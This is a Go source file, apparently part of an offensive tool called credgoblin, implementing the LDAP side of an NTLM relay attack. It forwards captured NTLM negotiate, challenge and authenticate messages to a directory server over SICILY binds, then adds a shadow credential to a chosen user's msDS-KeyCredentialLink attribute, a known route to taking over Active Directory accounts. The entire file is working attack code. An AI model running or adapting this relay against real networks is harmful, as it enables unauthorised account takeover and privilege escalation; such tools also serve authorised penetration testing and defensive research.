package relay

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"strings"

	ber "github.com/go-asn1-ber/asn1-ber"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// LDAPClient handles LDAP connections with NTLM authentication
type LDAPClient struct {
	targetURL   string
	logger      *output.Logger
	rawConn     net.Conn
	messageID   int64
	sicilyState int // 0=not started, 1=discovery sent, 2=negotiate sent, 3=authenticated
}

// NewLDAPClient creates a new LDAP client
func NewLDAPClient(targetURL string, logger *output.Logger) *LDAPClient {
	return &LDAPClient{
		targetURL: targetURL,
		logger:    logger,
	}
}

// Connect establishes connection to LDAP server
func (c *LDAPClient) Connect() error {
	c.logger.Debug(fmt.Sprintf("Connecting to LDAP: %s", c.targetURL))

	// Parse URL to determine if ldaps or ldap
	target := c.targetURL
	if !strings.Contains(target, "://") {
		target = "ldap://" + target
	}

	u, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("invalid LDAP URL: %w", err)
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		if u.Scheme == "ldaps" {
			host += ":636"
		} else {
			host += ":389"
		}
	}

	// Create raw TCP connection for SICILY
	var rawConn net.Conn
	if u.Scheme == "ldaps" {
		rawConn, err = tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
	} else {
		rawConn, err = net.Dial("tcp", host)
	}

	if err != nil {
		return fmt.Errorf("failed to connect to LDAP: %w", err)
	}

	c.rawConn = rawConn
	c.messageID = 1
	c.logger.Debug("Connected to LDAP server")

	return nil
}

// ForwardNegotiate forwards NTLM Type 1 message to LDAP using SICILY
func (c *LDAPClient) ForwardNegotiate(type1 []byte) ([]byte, error) {
	c.logger.Debug("Forwarding NTLM Type 1 to LDAP via SICILY")

	// Step 1: SICILY Package Discovery (if not already done)
	if c.sicilyState == 0 {
		if err := c.sicilyDiscovery(); err != nil {
			return nil, fmt.Errorf("SICILY discovery failed: %w", err)
		}
		c.sicilyState = 1
	}

	// Step 2: Send SICILY Negotiate with NTLM Type 1
	if err := c.sicilyNegotiate(type1); err != nil {
		return nil, fmt.Errorf("SICILY negotiate failed: %w", err)
	}

	// Step 3: Receive SICILY Response with NTLM Type 2
	type2, err := c.sicilyReceiveChallenge()
	if err != nil {
		return nil, fmt.Errorf("SICILY receive challenge failed: %w", err)
	}

	c.sicilyState = 2
	c.logger.Debug("Successfully received NTLM Type 2 from LDAP")

	return type2, nil
}

// ForwardAuthenticate forwards NTLM Type 3 message to LDAP
func (c *LDAPClient) ForwardAuthenticate(type3 []byte) error {
	c.logger.Debug("Forwarding NTLM Type 3 to LDAP")

	// Send SICILY Response with NTLM Type 3
	if err := c.sicilyAuthenticate(type3); err != nil {
		return fmt.Errorf("SICILY authenticate failed: %w", err)
	}

	// Receive bind response
	if err := c.sicilyReceiveBindResponse(); err != nil {
		return fmt.Errorf("SICILY bind response failed: %w", err)
	}

	c.sicilyState = 3
	c.logger.Debug("SICILY authentication successful")

	return nil
}

// ModifyKeyCredential adds shadow credentials to target user
func (c *LDAPClient) ModifyKeyCredential(userDN string, keyCredential []byte) error {
	c.logger.Debug(fmt.Sprintf("Adding KeyCredential to %s", userDN))

	if c.rawConn == nil {
		return fmt.Errorf("not connected to LDAP")
	}

	// Build LDAP modify request
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	modifyRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 6, nil, "Modify Request")
	modifyRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, userDN, "DN"))

	changes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Changes")

	change := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Change")
	change.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Operation (add)"))

	modification := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Modification")
	modification.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "msDS-KeyCredentialLink", "Attribute"))

	values := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSet, nil, "Values")
	values.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(keyCredential), "Value"))

	modification.AppendChild(values)
	change.AppendChild(modification)
	changes.AppendChild(change)
	modifyRequest.AppendChild(changes)
	packet.AppendChild(modifyRequest)

	// Send modify request
	if err := c.sendPacket(packet); err != nil {
		return fmt.Errorf("failed to send modify request: %w", err)
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive modify response: %w", err)
	}

	// Check result code
	if len(response.Children) < 2 {
		return fmt.Errorf("invalid modify response structure")
	}

	modifyResponse := response.Children[1]
	if len(modifyResponse.Children) < 1 {
		return fmt.Errorf("no result code in modify response")
	}

	resultCode := modifyResponse.Children[0]
	code, ok := resultCode.Value.(int64)
	if !ok {
		return fmt.Errorf("invalid result code type")
	}

	if code != 0 {
		// Try to get error message
		errMsg := "unknown error"
		if len(modifyResponse.Children) >= 3 {
			if msg, ok := modifyResponse.Children[2].Value.(string); ok {
				errMsg = msg
			}
		}
		return fmt.Errorf("LDAP modify failed with result code %d: %s", code, errMsg)
	}

	c.logger.Debug("Successfully modified msDS-KeyCredentialLink")
	return nil
}

// Close closes the LDAP connection
func (c *LDAPClient) Close() error {
	if c.rawConn != nil {
		c.rawConn.Close()
	}
	return nil
}

// sicilyDiscovery performs SICILY package discovery
func (c *LDAPClient) sicilyDiscovery() error {
	c.logger.Debug("Sending SICILY package discovery")

	// Build SICILY discovery bind request
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SICILY_PACKAGE_DISCOVERY: authentication choice 0xA3 with value "SICILY_PACKAGE_DISCOVERY"
	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, 3, "SICILY_PACKAGE_DISCOVERY", "Authentication")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	// Send the packet
	if err := c.sendPacket(packet); err != nil {
		return err
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return err
	}

	// Parse response to check for supported auth methods
	c.logger.Debug(fmt.Sprintf("SICILY discovery response received (len=%d)", len(response.Bytes())))

	return nil
}

// sicilyNegotiate sends NTLM Type 1 in SICILY negotiate
func (c *LDAPClient) sicilyNegotiate(type1 []byte) error {
	c.logger.Debug("Sending SICILY negotiate with NTLM Type 1")

	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SICILY_NEGOTIATE: authentication choice 0xA3 with NTLM Type 1
	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, 3, string(type1), "Authentication")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	return c.sendPacket(packet)
}

// sicilyReceiveChallenge receives NTLM Type 2 from SICILY response
func (c *LDAPClient) sicilyReceiveChallenge() ([]byte, error) {
	c.logger.Debug("Receiving SICILY challenge (NTLM Type 2)")

	response, err := c.receivePacket()
	if err != nil {
		return nil, err
	}

	// Navigate through BER structure to find the NTLM Type 2
	// Response structure: SEQUENCE -> BindResponse (tag 0x61) -> serverSaslCreds (tag 0x87)
	if len(response.Children) < 2 {
		return nil, fmt.Errorf("invalid SICILY response structure")
	}

	bindResponse := response.Children[1]
	if bindResponse.Tag != 1 { // BindResponse is tag 1
		return nil, fmt.Errorf("expected BindResponse, got tag %d", bindResponse.Tag)
	}

	// Find serverSaslCreds (tag 7 with context class)
	var type2 []byte
	for _, child := range bindResponse.Children {
		if child.Tag == 7 && child.ClassType == ber.ClassContext {
			type2 = child.ByteValue
			break
		}
	}

	if len(type2) == 0 {
		return nil, fmt.Errorf("no NTLM Type 2 found in SICILY response")
	}

	c.logger.Debug(fmt.Sprintf("Received NTLM Type 2 (%d bytes)", len(type2)))

	return type2, nil
}

// sicilyAuthenticate sends NTLM Type 3 in SICILY response
func (c *LDAPClient) sicilyAuthenticate(type3 []byte) error {
	c.logger.Debug("Sending SICILY authenticate with NTLM Type 3")

	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SICILY_RESPONSE: authentication choice 0xA3 with NTLM Type 3
	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, 3, string(type3), "Authentication")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	return c.sendPacket(packet)
}

// sicilyReceiveBindResponse receives the final bind response
func (c *LDAPClient) sicilyReceiveBindResponse() error {
	c.logger.Debug("Receiving SICILY bind response")

	response, err := c.receivePacket()
	if err != nil {
		return err
	}

	// Check result code
	if len(response.Children) < 2 {
		return fmt.Errorf("invalid bind response structure")
	}

	bindResponse := response.Children[1]
	if bindResponse.Tag != 1 {
		return fmt.Errorf("expected BindResponse, got tag %d", bindResponse.Tag)
	}

	// First child should be result code
	if len(bindResponse.Children) < 1 {
		return fmt.Errorf("no result code in bind response")
	}

	resultCode := bindResponse.Children[0]
	code, ok := resultCode.Value.(int64)
	if !ok {
		return fmt.Errorf("invalid result code type")
	}

	if code != 0 {
		return fmt.Errorf("LDAP bind failed with result code: %d", code)
	}

	c.logger.Debug("SICILY bind successful")

	return nil
}

// sendPacket sends an LDAP packet
func (c *LDAPClient) sendPacket(packet *ber.Packet) error {
	data := packet.Bytes()

	_, err := c.rawConn.Write(data)
	if err != nil {
		return fmt.Errorf("failed to write LDAP packet: %w", err)
	}

	c.logger.Debug(fmt.Sprintf("Sent LDAP packet (%d bytes)", len(data)))

	return nil
}

// receivePacket receives an LDAP packet
func (c *LDAPClient) receivePacket() (*ber.Packet, error) {
	// Read LDAP packet from connection
	// LDAP uses BER encoding, we need to read the length first

	// Read first 2 bytes to get the tag and length indicator
	header := make([]byte, 2)
	_, err := c.rawConn.Read(header)
	if err != nil {
		return nil, fmt.Errorf("failed to read packet header: %w", err)
	}

	// Calculate total length needed
	var length int
	if header[1] < 128 {
		// Short form
		length = int(header[1])
	} else {
		// Long form
		numBytes := int(header[1] & 0x7f)
		lengthBytes := make([]byte, numBytes)
		_, err := c.rawConn.Read(lengthBytes)
		if err != nil {
			return nil, fmt.Errorf("failed to read length bytes: %w", err)
		}

		// Reconstruct header with length bytes
		header = append(header, lengthBytes...)

		// Calculate length
		length = 0
		for i := 0; i < numBytes; i++ {
			length = (length << 8) | int(lengthBytes[i])
		}
	}

	// Read the rest of the packet
	data := make([]byte, length)
	totalRead := 0
	for totalRead < length {
		n, err := c.rawConn.Read(data[totalRead:])
		if err != nil {
			return nil, fmt.Errorf("failed to read packet data: %w", err)
		}
		totalRead += n
	}

	// Combine header and data
	fullPacket := append(header, data...)

	c.logger.Debug(fmt.Sprintf("Received LDAP packet (%d bytes)", len(fullPacket)))

	// Decode BER packet
	packet := ber.DecodePacket(fullPacket)

	return packet, nil
}
